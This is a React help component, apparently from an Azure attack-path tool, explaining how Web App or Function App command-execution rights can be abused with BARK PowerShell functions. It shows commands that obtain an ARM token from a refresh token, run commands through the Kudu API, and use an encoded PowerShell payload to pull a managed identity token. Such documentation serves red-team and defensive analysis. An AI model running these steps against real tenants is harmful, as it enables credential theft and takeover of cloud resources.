import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                You can use BARK's Invoke-AzureRMWebAppShellCommand function 
                to execute commands on a target Web App. You can use BARK's 
                New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, 
                and Get-AzureFunctionOutput functions to execute arbitrary 
                commands against a target Function App.
            </p>

            <p>
                These functions require you to supply an Azure Resource Manager
                scoped JWT associated with the principal that has the privilege
                to execute commands on the web app or function app. There are
                several ways to acquire a JWT. For example, you may use BARK's
                Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
                by supplying a refresh token:
            </p>

                <pre>
                    <code>
                        {
                            '$ARMToken = Get-ARMTokenWithRefreshToken `\n' +
                            '    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n' +
                            '    -TenantID "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                Now you can use BARK's Invoke-AzureRMWebAppShellCommand function 
                to execute a command against the target Web App.
                For example, to run a simple "whoami" command:
            </p>

            <pre>
                <code>
                    {
                        'Invoke-AzureRMWebAppShellCommand `\n' +
                        '    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n' +
                        '    -Token $ARMToken `\n' +
                        '    -Command "whoami"'
                    }
                </code>
                
            </pre>

            <p>
                If the Web App has a managed identity assignments, you can use BARK's 
                Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the 
                managed identity Service Principal like this:
            </p>

            
                <pre>
                    <code>
                        {
                            'PS C:\> $PowerShellCommand = ' + '\n' +
                            '            $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}\n' +
                            '            $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers\n' +
                            '            $response.RawContent' + '\n\n' +
                    
                            'PS C:\> $base64Cmd = [System.Convert]::ToBase64String(\n' +
                            '            [System.Text.Encoding]::Unicode.GetBytes(\n' +
                            '                $PowerShellCommand\n' +
                            '            )\n' +
                            '        )\n\n' +

                            'PS C:\> $Command = "powershell -enc $($base64Cmd)"\n\n' +

                            'PS C:\> Invoke-AzureRMWebAppShellCommand `\n' +
                            '            -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n' +
                            '            -token $ARMToken `\n' +
                            '            -Command $Command'
                        }
                    </code>
                </pre>
            

            <p>
                If successful, the output will include a JWT for the managed identity 
                service principal.
            </p>
        </>
    );
};

export default Abuse;
